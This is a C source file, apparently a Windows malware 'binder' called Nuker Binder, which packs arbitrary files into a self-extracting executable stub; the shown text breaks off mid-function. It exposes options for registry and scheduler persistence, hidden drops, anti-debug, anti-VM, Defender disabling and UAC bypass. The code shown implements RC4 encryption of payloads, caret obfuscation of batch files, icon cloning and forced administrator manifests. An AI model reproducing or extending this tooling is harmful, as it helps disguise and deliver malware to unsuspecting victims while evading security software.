/*
 *  ============================================================
 *   Nuker Binder v2.0 - Professional File Binding Utility
 *   Copyright (c) 2026 NukerGroup. All Rights Reserved.
 *
 *   Developed by NukerGroup Engineering Division
 *   Licensed under NukerGroup Proprietary License (NGPL)
 *  ============================================================
 */

#ifdef _MSC_VER
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "comdlg32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")
#endif

#include <windows.h>
#include <commctrl.h>
#include <commdlg.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "NUkerStubData.h"

#define NUKER_MAGIC              0x424E534D
#define NUKER_VERSION            0x00020000
#define NUKER_MAX_FILES          512
#define NUKER_MAX_FILEPATH       520
#define NUKER_CRC_POLY           0xEDB88320UL
#define NUKER_WINDOW_W           750
#define NUKER_WINDOW_H           520
#define NUKER_TITLEBAR_H         45
#define NUKER_STUB_MAGIC         0x53424E4D

#define NUKER_FL_COMPRESS        0x0001
#define NUKER_FL_ENCRYPT         0x0002

#define NUKER_STARTUP_NONE       0
#define NUKER_STARTUP_REGISTRY   1
#define NUKER_STARTUP_SCHEDULER  2

#define NUKER_DROP_APPDATA       0
#define NUKER_DROP_TEMP          1
#define NUKER_DROP_CURRENT       2
#define NUKER_DROP_CUSTOM        3

#define NUKER_EXEC_RUNNING       0
#define NUKER_EXEC_RUNONCE       1
#define NUKER_EXEC_NORUN         2

#define NUKER_ID_LV              2001
#define NUKER_ID_BTN_BUILDEXE    2003
#define NUKER_ID_CHK_COMP        2004
#define NUKER_ID_CHK_HIDDEN      2008
#define NUKER_ID_CMB_DROP        2009
#define NUKER_ID_STATUSBAR       2010
#define NUKER_ID_PROGRESS        2011
#define NUKER_ID_LBL_TOTALSIZE   2012
#define NUKER_ID_CHK_UAC         2015
#define NUKER_ID_CHK_PUMP        2016
#define NUKER_ID_PUMP_EDIT       2017
#define NUKER_ID_BTN_ICON        2018
#define NUKER_ID_LBL_ICON        2019
#define NUKER_ID_CHK_SELFDEL     2020
#define NUKER_ID_CHK_ANTIDEBUG   2021
#define NUKER_ID_CHK_ANTIKILL    2022
#define NUKER_ID_CHK_WDDISABLE   2023
#define NUKER_ID_CHK_UACBYPASS   2024
#define NUKER_ID_CHK_ANTIVM      2025
#define NUKER_ID_BTN_CRYPTER     2026
#define NUKER_ID_CHK_TASKMGR     2027
#define NUKER_ID_BTN_BUILDBAT    2028

#define NUKER_CTX_REMOVE         3001
#define NUKER_CTX_MOVEUP         3002
#define NUKER_CTX_MOVEDOWN       3003
#define NUKER_CTX_CLEAR          3004

#define NUKER_CTX_DROP_APPDATA   3010
#define NUKER_CTX_DROP_TEMP      3011
#define NUKER_CTX_DROP_CURRENT   3012
#define NUKER_CTX_DROP_CUSTOM    3013
#define NUKER_CTX_START_REG      3020
#define NUKER_CTX_START_SCH      3021
#define NUKER_CTX_START_NONE     3022
#define NUKER_CTX_EXEC_RUNNING   3030
#define NUKER_CTX_EXEC_RUNONCE   3031
#define NUKER_CTX_EXEC_NORUN     3032
#define NUKER_CTX_HIDDEN_ON      3040
#define NUKER_CTX_HIDDEN_OFF     3041

#define NUKER_CTX_SLEEP          3060
#define NUKER_CTX_RESET          3070
#define NUKER_CTX_ABOUT          3080

#define NUKER_CTX_ADD_FILES      3100

#define NUKER_CLR_BG             RGB(250, 250, 250)
#define NUKER_CLR_TEXT           RGB(30, 30, 30)
#define NUKER_CLR_BORDER         RGB(230, 230, 230)
#define NUKER_CLR_BTN            RGB(255, 255, 255)
#define NUKER_CLR_LISTBG         RGB(255, 255, 255)
#define NUKER_CLR_TITLEBAR       RGB(15, 15, 15)
#define NUKER_CLR_TITLETXT       RGB(255, 255, 255)
#define NUKER_CLR_TITLEBTN       RGB(180, 180, 180)
#define NUKER_CLR_TITLEBTNHOV    RGB(232, 17, 35)

#pragma pack(push, 1)
typedef struct {
    DWORD NUkerMagic;
    DWORD NUkerVersion;
    DWORD NUkerFileCount;
    DWORD NUkerFlags;
    DWORD NUkerReserved1;
    DWORD NUkerTotalOrigSize;
    DWORD NUkerTotalCompSize;
    DWORD NUkerCreationTimeLow;
    DWORD NUkerCreationTimeHigh;
    BYTE  NUkerReserved[28];
} NUKER_ARCHIVE_HEADER;

typedef struct {
    char  NUkerFileName[NUKER_MAX_FILEPATH];
    DWORD NUkerOriginalSize;
    DWORD NUkerCompressedSize;
    DWORD NUkerDataOffset;
    DWORD NUkerChecksum;
    DWORD NUkerPriority;
    DWORD NUkerFileAttributes;
    DWORD NUkerEntryFlags;
    DWORD NUkerStartupType;
    DWORD NUkerExecMode;
    DWORD NUkerHiddenFlag;
    DWORD NUkerDeleteFlag;
    DWORD NUkerSleepMs;
    char  NUkerCustomDrop[NUKER_MAX_FILEPATH];
    BYTE  NUkerEntryReserved[8];
} NUKER_FILE_ENTRY;

typedef struct {
    DWORD NUkerArchiveOffset;
    char  NUkerDropPath[NUKER_MAX_FILEPATH];
    DWORD NUkerAutoExec;
    DWORD NUkerStubFlags;
    DWORD NUkerSelfDelete;
    DWORD NUkerStubMagic;
} NUKER_STUB_FOOTER;
#pragma pack(pop)

typedef struct {
    char  NUkerPath[NUKER_MAX_FILEPATH];
    char  NUkerName[260];
    char  NUkerDropDir[NUKER_MAX_FILEPATH];
    DWORD NUkerSize;
    DWORD NUkerPriority;
    DWORD NUkerAttributes;
    DWORD NUkerCRC;
    DWORD NUkerStartup;
    DWORD NUkerExecMode;
    BOOL  NUkerHidden;
    DWORD NUkerSleepMs;
} NUKER_LIST_ITEM;

static HINSTANCE       NUkerAppInstance;
static HWND            NUkerMainWindow;
static HWND            NUkerListView;
static HWND            NUkerStatusBar;
static HWND            NUkerProgressBar;
static HWND            NUkerChkCompress;
static HWND            NUkerChkHidden;
static HWND            NUkerChkPump;
static HWND            NUkerChkSelfDel;
static HWND            NUkerPumpEdit;
static HWND            NUkerCmbDrop;
static HWND            NUkerLblTotal;
static char            NUkerCustomDropPath[NUKER_MAX_FILEPATH];
static char            NUkerIconSourcePath[NUKER_MAX_FILEPATH];

static BOOL            NUkerOptAntiDebug = FALSE;
static BOOL            NUkerOptAntiKill = FALSE;
static BOOL            NUkerOptWdDisable = FALSE;
static BOOL            NUkerOptUacBypass = FALSE;
static BOOL            NUkerOptAntiVm = FALSE;
static BOOL            NUkerOptTaskMgr = FALSE;
static BOOL            NUkerOptEncrypt = FALSE;

static NUKER_LIST_ITEM NUkerFileList[NUKER_MAX_FILES];
static int             NUkerFileCount = 0;
static HFONT           NUkerFontNormal;
static HFONT           NUkerFontBold;
static HFONT           NUkerFontMono;
static HBRUSH          NUkerBrushBg;
static HBRUSH          NUkerBrushListBg;
static HBRUSH          NUkerBrushBtn;
static HBRUSH          NUkerBrushTitleBar;
static DWORD           NUkerCrcTable[256];
static BOOL            NUkerCrcTableReady = FALSE;
static BOOL            NUkerOperationActive = FALSE;
static BOOL            NUkerDraggingTitle = FALSE;
static POINT           NUkerDragStart;
static int             NUkerHoverCloseBtn = 0;

static const char NUkerCopyright[] =
    "Nuker Binder v2.0 - (c) 2026 NukerGroup\r\n"
    "All Rights Reserved.\r\n\r\n"
    "Professional File Binding & Archiving Utility\r\n"
    "Developed by NukerGroup Engineering Division\r\n\r\n"
    "Features:\r\n"
    "  - Self-extracting EXE builder\r\n"
    "  - Per-file drop paths & execution modes\r\n"
    "  - Startup persistence (Registry / Scheduler)\r\n"
    "  - RLE Compression engine\r\n"
    "  - Hidden extraction mode\r\n"
    "  - Icon & description cloning\r\n"
    "  - UAC manifest injection\r\n"
    "  - File size pump\r\n\r\n"
    "Licensed under NukerGroup Proprietary License";

void NUkerInitCrcTable(void)
{
    DWORD NUkerCrc, NUkerIdx, NUkerBit;
    if (NUkerCrcTableReady) return;
    for (NUkerIdx = 0; NUkerIdx < 256; NUkerIdx++) {
        NUkerCrc = NUkerIdx;
        for (NUkerBit = 0; NUkerBit < 8; NUkerBit++) {
            if (NUkerCrc & 1) NUkerCrc = (NUkerCrc >> 1) ^ NUKER_CRC_POLY;
            else NUkerCrc >>= 1;
        }
        NUkerCrcTable[NUkerIdx] = NUkerCrc;
    }
    NUkerCrcTableReady = TRUE;
}

DWORD NUkerCalcCrc32(const BYTE *NUkerData, DWORD NUkerLen)
{
    DWORD NUkerCrc = 0xFFFFFFFF, NUkerPos;
    NUkerInitCrcTable();
    for (NUkerPos = 0; NUkerPos < NUkerLen; NUkerPos++)
        NUkerCrc = NUkerCrcTable[(NUkerCrc ^ NUkerData[NUkerPos]) & 0xFF] ^ (NUkerCrc >> 8);
    return NUkerCrc ^ 0xFFFFFFFF;
}

DWORD NUkerCompressRLE(const BYTE *NUkerSrc, DWORD NUkerSrcLen, BYTE *NUkerDst, DWORD NUkerDstCap)
{
    DWORD NUkerSrcPos = 0, NUkerDstPos = 0, NUkerRunLen, NUkerLitLen;
    if (NUkerDstCap < 8) return 0;
    while (NUkerSrcPos < NUkerSrcLen && NUkerDstPos + 4 < NUkerDstCap) {
        NUkerRunLen = 1;
        while (NUkerSrcPos + NUkerRunLen < NUkerSrcLen &&
               NUkerSrc[NUkerSrcPos] == NUkerSrc[NUkerSrcPos + NUkerRunLen] &&
               NUkerRunLen < 127) NUkerRunLen++;
        if (NUkerRunLen >= 3) {
            if (NUkerDstPos + 2 > NUkerDstCap) return 0;
            NUkerDst[NUkerDstPos++] = (BYTE)(0x80 | NUkerRunLen);
            NUkerDst[NUkerDstPos++] = NUkerSrc[NUkerSrcPos];
            NUkerSrcPos += NUkerRunLen;
        } else {
            NUkerLitLen = 0;
            while (NUkerSrcPos + NUkerLitLen < NUkerSrcLen && NUkerLitLen < 127) {
                if (NUkerSrcPos + NUkerLitLen + 2 < NUkerSrcLen &&
                    NUkerSrc[NUkerSrcPos + NUkerLitLen] == NUkerSrc[NUkerSrcPos + NUkerLitLen + 1] &&
                    NUkerSrc[NUkerSrcPos + NUkerLitLen] == NUkerSrc[NUkerSrcPos + NUkerLitLen + 2]) break;
                NUkerLitLen++;
            }
            if (NUkerLitLen == 0) NUkerLitLen = 1;
            if (NUkerDstPos + 1 + NUkerLitLen > NUkerDstCap) return 0;
            NUkerDst[NUkerDstPos++] = (BYTE)NUkerLitLen;
            memcpy(NUkerDst + NUkerDstPos, NUkerSrc + NUkerSrcPos, NUkerLitLen);
            NUkerDstPos += NUkerLitLen;
            NUkerSrcPos += NUkerLitLen;
        }
    }
    return (NUkerSrcPos == NUkerSrcLen) ? NUkerDstPos : 0;
}

void NUkerFormatSize(DWORD NUkerBytes, char *NUkerBuf, int NUkerBufLen)
{
    if (NUkerBytes >= 1073741824)
        _snprintf(NUkerBuf, NUkerBufLen, "%.2f GB", NUkerBytes / 1073741824.0);
    else if (NUkerBytes >= 1048576)
        _snprintf(NUkerBuf, NUkerBufLen, "%.2f MB", NUkerBytes / 1048576.0);
    else if (NUkerBytes >= 1024)
        _snprintf(NUkerBuf, NUkerBufLen, "%.1f KB", NUkerBytes / 1024.0);
    else
        _snprintf(NUkerBuf, NUkerBufLen, "%lu B", (unsigned long)NUkerBytes);
}

const char *NUkerExecModeName(DWORD NUkerMode)
{
    switch (NUkerMode) {
        case NUKER_EXEC_RUNNING: return "Running";
        case NUKER_EXEC_RUNONCE: return "Runonce";
        case NUKER_EXEC_NORUN:   return "No Run";
    }
    return "Running";
}

void NUkerExtractFileName(const char *NUkerFullPath, char *NUkerName, int NUkerNameLen)
{
    const char *NUkerSlash, *NUkerBack;
    NUkerSlash = strrchr(NUkerFullPath, '/');
    NUkerBack = strrchr(NUkerFullPath, '\\');
    if (NUkerBack && (!NUkerSlash || NUkerBack > NUkerSlash)) NUkerSlash = NUkerBack;
    if (NUkerSlash) _snprintf(NUkerName, NUkerNameLen, "%s", NUkerSlash + 1);
    else _snprintf(NUkerName, NUkerNameLen, "%s", NUkerFullPath);
}

void NUkerSetStatus(const char *NUkerMsg)
{
    if (NUkerStatusBar) SendMessageA(NUkerStatusBar, SB_SETTEXTA, 0, (LPARAM)NUkerMsg);
}

void NUkerSetProgress(int NUkerPercent)
{
    if (NUkerProgressBar) SendMessageA(NUkerProgressBar, PBM_SETPOS, NUkerPercent, 0);
}

void NUkerUpdateTotalSize(void)
{
    DWORD NUkerTotal = 0;
    int NUkerI;
    char NUkerBuf[128], NUkerSzBuf[32];
    for (NUkerI = 0; NUkerI < NUkerFileCount; NUkerI++)
        NUkerTotal += NUkerFileList[NUkerI].NUkerSize;
    NUkerFormatSize(NUkerTotal, NUkerSzBuf, sizeof(NUkerSzBuf));
    _snprintf(NUkerBuf, sizeof(NUkerBuf), "  FILES: %d  |  TOTAL: %s", NUkerFileCount, NUkerSzBuf);
    if (NUkerLblTotal) SetWindowTextA(NUkerLblTotal, NUkerBuf);
}

void NUkerRefreshListView(void)
{
    LVITEMA NUkerLvi;
    char NUkerSzBuf[32], NUkerIdxBuf[8], NUkerSleepBuf[16], NUkerFlagsBuf[32];
    int NUkerI;
    SendMessageA(NUkerListView, LVM_DELETEALLITEMS, 0, 0);
    for (NUkerI = 0; NUkerI < NUkerFileCount; NUkerI++) {
        memset(&NUkerLvi, 0, sizeof(NUkerLvi));
        NUkerLvi.mask = LVIF_TEXT;
        NUkerLvi.iItem = NUkerI;
        _snprintf(NUkerIdxBuf, sizeof(NUkerIdxBuf), "%d", NUkerI + 1);
        NUkerLvi.iSubItem = 0;
        NUkerLvi.pszText = NUkerIdxBuf;
        SendMessageA(NUkerListView, LVM_INSERTITEMA, 0, (LPARAM)&NUkerLvi);
        NUkerLvi.iSubItem = 1;
        NUkerLvi.pszText = NUkerFileList[NUkerI].NUkerName;
        SendMessageA(NUkerListView, LVM_SETITEMA, 0, (LPARAM)&NUkerLvi);
        NUkerFormatSize(NUkerFileList[NUkerI].NUkerSize, NUkerSzBuf, sizeof(NUkerSzBuf));
        NUkerLvi.iSubItem = 2;
        NUkerLvi.pszText = NUkerSzBuf;
        SendMessageA(NUkerListView, LVM_SETITEMA, 0, (LPARAM)&NUkerLvi);
        NUkerLvi.iSubItem = 3;
        NUkerLvi.pszText = (NUkerFileList[NUkerI].NUkerDropDir[0] != '\0') ? NUkerFileList[NUkerI].NUkerDropDir : (char *)"(Default)";
        SendMessageA(NUkerListView, LVM_SETITEMA, 0, (LPARAM)&NUkerLvi);
        NUkerLvi.iSubItem = 4;
        NUkerLvi.pszText = (char *)NUkerExecModeName(NUkerFileList[NUkerI].NUkerExecMode);
        SendMessageA(NUkerListView, LVM_SETITEMA, 0, (LPARAM)&NUkerLvi);
        NUkerFlagsBuf[0] = '\0';
        if (NUkerFileList[NUkerI].NUkerHidden) strcat(NUkerFlagsBuf, "H ");
        if (NUkerFileList[NUkerI].NUkerStartup == NUKER_STARTUP_REGISTRY) strcat(NUkerFlagsBuf, "Reg ");
        else if (NUkerFileList[NUkerI].NUkerStartup == NUKER_STARTUP_SCHEDULER) strcat(NUkerFlagsBuf, "Sch ");
        if (NUkerFlagsBuf[0] == '\0') strcpy(NUkerFlagsBuf, "-");
        NUkerLvi.iSubItem = 5;
        NUkerLvi.pszText = NUkerFlagsBuf;
        SendMessageA(NUkerListView, LVM_SETITEMA, 0, (LPARAM)&NUkerLvi);
        if (NUkerFileList[NUkerI].NUkerSleepMs > 0) _snprintf(NUkerSleepBuf, sizeof(NUkerSleepBuf), "%lu ms", (unsigned long)NUkerFileList[NUkerI].NUkerSleepMs);
        else strcpy(NUkerSleepBuf, "-");
        NUkerLvi.iSubItem = 6;
        NUkerLvi.pszText = NUkerSleepBuf;
        SendMessageA(NUkerListView, LVM_SETITEMA, 0, (LPARAM)&NUkerLvi);
    }
    NUkerUpdateTotalSize();
}

BOOL NUkerCheckDuplicate(const char *NUkerPath)
{
    int NUkerI;
    for (NUkerI = 0; NUkerI < NUkerFileCount; NUkerI++)
        if (_stricmp(NUkerFileList[NUkerI].NUkerPath, NUkerPath) == 0) return TRUE;
    return FALSE;
}

void NUkerRC4(BYTE *NUkerData, DWORD NUkerLen, BYTE *NUkerKey, DWORD NUkerKeyLen)
{
    BYTE NUkerS[256];
    BYTE NUkerI = 0, NUkerJ = 0, NUkerTemp;
    DWORD NUkerK;
    for (int i = 0; i < 256; i++) NUkerS[i] = (BYTE)i;
    for (int i = 0; i < 256; i++) {
        NUkerJ = (BYTE)(NUkerJ + NUkerS[i] + NUkerKey[i % NUkerKeyLen]);
        NUkerTemp = NUkerS[i]; NUkerS[i] = NUkerS[NUkerJ]; NUkerS[NUkerJ] = NUkerTemp;
    }
    NUkerI = 0; NUkerJ = 0;
    for (NUkerK = 0; NUkerK < NUkerLen; NUkerK++) {
        NUkerI = (BYTE)(NUkerI + 1);
        NUkerJ = (BYTE)(NUkerJ + NUkerS[NUkerI]);
        NUkerTemp = NUkerS[NUkerI]; NUkerS[NUkerI] = NUkerS[NUkerJ]; NUkerS[NUkerJ] = NUkerTemp;
        NUkerData[NUkerK] ^= NUkerS[(BYTE)(NUkerS[NUkerI] + NUkerS[NUkerJ])];
    }
}

void NUkerObfuscateBatch(BYTE *NUkerData, DWORD NUkerLen, BYTE **NUkerOut, DWORD *NUkerOutLen)
{
    DWORD NUkerNewSize = NUkerLen * 2 + 100;
    BYTE *NUkerBuf = (BYTE *)malloc(NUkerNewSize);
    DWORD NUkerJ = 0;
    for (DWORD i = 0; i < NUkerLen; i++) {
        NUkerBuf[NUkerJ++] = NUkerData[i];
        if (NUkerData[i] >= 'A' && NUkerData[i] <= 'z' && (rand() % 5 == 0)) {
            NUkerBuf[NUkerJ++] = '^';
        }
    }
    NUkerBuf[NUkerJ] = '\0';
    *NUkerOut = NUkerBuf;
    *NUkerOutLen = NUkerJ;
}

void NUkerWriteManifest(const char *NUkerExePath, BOOL NUkerRequireAdmin)
{
    const char *NUkerLevel = NUkerRequireAdmin ? "requireAdministrator" : "asInvoker";
    char NUkerManifest[1024];
    HANDLE NUkerResHandle;
    _snprintf(NUkerManifest, sizeof(NUkerManifest),
        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n"
        "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\r\n"
        "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">\r\n"
        "    <security>\r\n"
        "      <requestedPrivileges>\r\n"
        "        <requestedExecutionLevel level=\"%s\" uiAccess=\"false\"/>\r\n"
        "      </requestedPrivileges>\r\n"
        "    </security>\r\n"
        "  </trustInfo>\r\n"
        "</assembly>\r\n", NUkerLevel);
    NUkerResHandle = BeginUpdateResourceA(NUkerExePath, FALSE);
    if (NUkerResHandle) {
        UpdateResourceA(NUkerResHandle, (LPCSTR)24, MAKEINTRESOURCEA(1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
            NUkerManifest, (DWORD)strlen(NUkerManifest));
        EndUpdateResourceA(NUkerResHandle, FALSE);
    }
}

#pragma pack(push, 1)
typedef struct { BYTE W,H,C,R; WORD P,B; DWORD S,O; } NUKER_ICO_DIR_ENTRY;
typedef struct { WORD R,T,C; } NUKER_ICO_DIR;
typedef struct { BYTE W,H,C,R; WORD P,B; DWORD S; WORD I; } NUKER_GRPICON_ENTRY;
typedef struct { WORD R,T,C; } NUKER_GRPICON_DIR;
#pragma pack(pop)

void NUkerEmbedIcoFile(const char *NUkerIcoPath, const char *NUkerDstExe)
{
    HANDLE NUkerIcoFile = CreateFileA(NUkerIcoPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (NUkerIcoFile == INVALID_HANDLE_VALUE) return;
    DWORD NUkerIcoSize = GetFileSize(NUkerIcoFile, NULL);
    BYTE *NUkerIcoData = (BYTE *)malloc(NUkerIcoSize);
    DWORD NUkerRead;
    ReadFile(NUkerIcoFile, NUkerIcoData, NUkerIcoSize, &NUkerRead, NULL);
    CloseHandle(NUkerIcoFile);
    NUKER_ICO_DIR NUkerDir; memcpy(&NUkerDir, NUkerIcoData, sizeof(NUKER_ICO_DIR));
    NUKER_ICO_DIR_ENTRY *NUkerDirEntries = (NUKER_ICO_DIR_ENTRY *)(NUkerIcoData + sizeof(NUKER_ICO_DIR));
    DWORD NUkerGrpSize = sizeof(NUKER_GRPICON_DIR) + NUkerDir.C * sizeof(NUKER_GRPICON_ENTRY);
    BYTE *NUkerGrpBuf = (BYTE *)calloc(1, NUkerGrpSize);
    NUKER_GRPICON_DIR *NUkerGrpDir = (NUKER_GRPICON_DIR *)NUkerGrpBuf;
    NUkerGrpDir->T = 1; NUkerGrpDir->C = NUkerDir.C;
    NUKER_GRPICON_ENTRY *NUkerGrpEntries = (NUKER_GRPICON_ENTRY *)(NUkerGrpBuf + sizeof(NUKER_GRPICON_DIR));
    for (int i = 0; i < NUkerDir.C; i++) {
        NUkerGrpEntries[i].W = NUkerDirEntries[i].W; NUkerGrpEntries[i].H = NUkerDirEntries[i].H;
        NUkerGrpEntries[i].C = NUkerDirEntries[i].C; NUkerGrpEntries[i].P = NUkerDirEntries[i].P;
        NUkerGrpEntries[i].B = NUkerDirEntries[i].B; NUkerGrpEntries[i].S = NUkerDirEntries[i].S;
        NUkerGrpEntries[i].I = (WORD)(i + 1);
    }
    HANDLE NUkerUpd = BeginUpdateResourceA(NUkerDstExe, FALSE);
    if (NUkerUpd) {
        for (int i = 0; i < NUkerDir.C; i++) {
            UpdateResourceA(NUkerUpd, RT_ICON, MAKEINTRESOURCEA(i + 1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), NUkerIcoData + NUkerDirEntries[i].O, NUkerDirEntries[i].S);
        }
        UpdateResourceA(NUkerUpd, RT_GROUP_ICON, MAKEINTRESOURCEA(1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), NUkerGrpBuf, NUkerGrpSize);
        EndUpdateResourceA(NUkerUpd, FALSE);
    }
    free(NUkerGrpBuf); free(NUkerIcoData);
}

void NUkerGetGlobalDropPath(char *NUkerOut, int NUkerOutLen)
{
    int NUkerSel = (int)SendMessageA(NUkerCmbDrop, CB_GETCURSEL, 0, 0);
    if (NUkerSel == NUKER_DROP_APPDATA) _snprintf(NUkerOut, NUkerOutLen, "%%APPDATA%%\\NUkerDrop");
    else if (NUkerSel == NUKER_DROP_TEMP) _snprintf(NUkerOut, NUkerOutLen, "%%TEMP%%\\NUkerDrop");
    else if (NUkerSel == NUKER_DROP_CURRENT) _snprintf(NUkerOut, NUkerOutLen, "%%CURRENT%%");
    else if (NUkerSel == NUKER_DROP_CUSTOM && NUkerCustomDropPath[0] != '\0') _snprintf(NUkerOut, NUkerOutLen, "%s", NUkerCustomDropPath);
    else _snprintf(NUkerOut, NUkerOutLen, "%%TEMP%%\\NUkerDrop");
}

HWND NUkerCreateButton(HWND NUkerParent, const char *NUkerText, int NUkerId, int NUkerX, int NUkerY, int NUkerW, int NUkerH)
{
    return CreateWindowExA(0, "BUTTON", NUkerText, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_FLAT, NUkerX, NUkerY, NUkerW, NUkerH, NUkerParent, (HMENU)(UINT_PTR)NUkerId, NUkerAppInstance, NULL);
}

HWND NUkerCreateCheck(HWND NUkerParent, const char *NUkerText, int NUkerId, int NUkerX, int NUkerY, int NUkerW, int NUkerH)
{
    return CreateWindowExA(0, "BUTTON", NUkerText, WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, NUkerX, NUkerY, NUkerW, NUkerH, NUkerParent, (HMENU)(UINT_PTR)NUkerId, NUkerAppInstance, NULL);
}

// --- CORE BUILD ENGINE ---
BOOL NUkerPerformBuild(const char *NUkerOutPath, BOOL NUkerShowMsg)
{
    char NUkerDropBuf[NUKER_MAX_FILEPATH];
    HANDLE NUkerOutFile;
    DWORD NUkerWritten, NUkerActualStubSize;
    NUKER_ARCHIVE_HEADER NUkerHdr;
    NUKER_FILE_ENTRY *NUkerEntries;
    NUKER_STUB_FOOTER NUkerFooter;
    DWORD NUkerFlags = 0, NUkerCurrentOffset, NUkerTotalOrig = 0, NUkerTotalComp = 0;
    int NUkerI;
    BOOL NUkerDoCompress;
    SYSTEMTIME NUkerSysTime;
    FILETIME NUkerFileTime;

    NUkerDoCompress = (SendMessageA(NUkerChkCompress, BM_GETCHECK, 0, 0) == BST_CHECKED);
    if (NUkerDoCompress) NUkerFlags |= NUKER_FL_COMPRESS;

    NUkerEntries = (NUKER_FILE_ENTRY *)calloc(NUkerFileCount, sizeof(NUKER_FILE_ENTRY));
    if (!NUkerEntries) return FALSE;

    NUkerOperationActive = TRUE;
    NUkerSetStatus("Preparing stub...");
    NUkerSetProgress(0);

    {
        HANDLE NUkerTmpFile = CreateFileA(NUkerOutPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (NUkerTmpFile == INVALID_HANDLE_VALUE) { free(NUkerEntries); NUkerOperationActive = FALSE; return FALSE; }
        WriteFile(NUkerTmpFile, NUkerStubBytes, NUkerStubSize, &NUkerWritten, NULL);
        CloseHandle(NUkerTmpFile);
    }

    if (NUkerIconSourcePath[0] != '\0') NUkerSetStatus("Embedding icon..."); NUkerEmbedIcoFile(NUkerIconSourcePath, NUkerOutPath);

    NUkerWriteManifest(NUkerOutPath, NUkerOptUacBypass);

    {
        HANDLE NUkerCheckFile = CreateFileA(NUkerOutPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        NUkerActualStubSize = GetFileSize(NUkerCheckFile, NULL);
        CloseHandle(NUkerCheckFile);
    }

    NUkerOutFile = CreateFileA(NUkerOutPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (NUkerOutFile == INVALID_HANDLE_VALUE) { free(NUkerEntries); NUkerOperationActive = FALSE; return FALSE; }

    NUkerSetStatus("Building executable...");
    memset(&NUkerHdr, 0, sizeof(NUkerHdr));
    NUkerHdr.NUkerMagic = NUKER_MAGIC; NUkerHdr.NUkerVersion = NUKER_VERSION;
    NUkerHdr.NUkerFileCount = (DWORD)NUkerFileCount; NUkerHdr.NUkerFlags = NUkerFlags;
    GetSystemTime(&NUkerSysTime); SystemTimeToFileTime(&NUkerSysTime, &NUkerFileTime);
    NUkerHdr.NUkerCreationTimeLow = NUkerFileTime.dwLowDateTime; NUkerHdr.NUkerCreationTimeHigh = NUkerFileTime.dwHighDateTime;

    SetFilePointer(NUkerOutFile, NUkerActualStubSize + sizeof(NUKER_ARCHIVE_HEADER) + ((DWORD)NUkerFileCount * sizeof(NUKER_FILE_ENTRY)), NULL, FILE_BEGIN);
    NUkerCurrentOffset = sizeof(NUKER_ARCHIVE_HEADER) + ((DWORD)NUkerFileCount * sizeof(NUKER_FILE_ENTRY));

    for (NUkerI = 0; NUkerI < NUkerFileCount; NUkerI++) {
        HANDLE NUkerInFile; BYTE *NUkerRawData, *NUkerProcData; DWORD NUkerFileSize, NUkerRead, NUkerProcSize; char NUkerStatusMsg[128];
        _snprintf(NUkerStatusMsg, sizeof(NUkerStatusMsg), "Building [%d/%d]: %s", NUkerI + 1, NUkerFileCount, NUkerFileList[NUkerI].NUkerName);
        NUkerSetStatus(NUkerStatusMsg);

        NUkerInFile = CreateFileA(NUkerFileList[NUkerI].NUkerPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (NUkerInFile == INVALID_HANDLE_VALUE) {
            _snprintf(NUkerEntries[NUkerI].NUkerFileName, NUKER_MAX_FILEPATH - 1, "%s", NUkerFileList[NUkerI].NUkerName);
            NUkerEntries[NUkerI].NUkerExecMode = NUKER_EXEC_NORUN; continue;
        }
        NUkerFileSize = GetFileSize(NUkerInFile, NULL); NUkerRawData = (BYTE *)malloc(NUkerFileSize + 1);
        ReadFile(NUkerInFile, NUkerRawData, NUkerFileSize, &NUkerRead, NULL); CloseHandle(NUkerInFile);

        _snprintf(NUkerEntries[NUkerI].NUkerFileName, NUKER_MAX_FILEPATH - 1, "%s", NUkerFileList[NUkerI].NUkerName);
        NUkerEntries[NUkerI].NUkerOriginalSize = NUkerFileSize; NUkerEntries[NUkerI].NUkerDataOffset = NUkerCurrentOffset;
        NUkerEntries[NUkerI].NUkerStartupType = NUkerFileList[NUkerI].NUkerStartup; NUkerEntries[NUkerI].NUkerExecMode = NUkerFileList[NUkerI].NUkerExecMode;
        NUkerEntries[NUkerI].NUkerHiddenFlag = NUkerFileList[NUkerI].NUkerHidden ? 1 : 0; NUkerEntries[NUkerI].NUkerSleepMs = NUkerFileList[NUkerI].NUkerSleepMs;
        NUkerEntries[NUkerI].NUkerChecksum = NUkerCalcCrc32(NUkerRawData, NUkerFileSize);

        if (NUkerFileList[NUkerI].NUkerDropDir[0] != '\0') _snprintf(NUkerEntries[NUkerI].NUkerCustomDrop, NUKER_MAX_FILEPATH - 1, "%s", NUkerFileList[NUkerI].NUkerDropDir);

        NUkerProcData = NUkerRawData; NUkerProcSize = NUkerFileSize;
        if (NUkerOptEncrypt) {
            BYTE NUkerKey[8]; for (int k = 0; k < 8; k++) NUkerKey[k] = (BYTE)(rand() % 256);
            if (strstr(_strlwr(NUkerFileList[NUkerI].NUkerName), ".bat")) {
                BYTE *NUkerObfBuf; DWORD NUkerObfLen; NUkerObfuscateBatch(NUkerRawData, NUkerFileSize, &NUkerObfBuf, &NUkerObfLen);
                NUkerRC4(NUkerObfBuf, NUkerObfLen, NUkerKey, 8); NUkerProcData = NUkerObfBuf; NUkerProcSize = NUkerObfLen;
            } else { NUkerRC4(NUkerRawData, NUkerFileSize, NUkerKey, 8); }
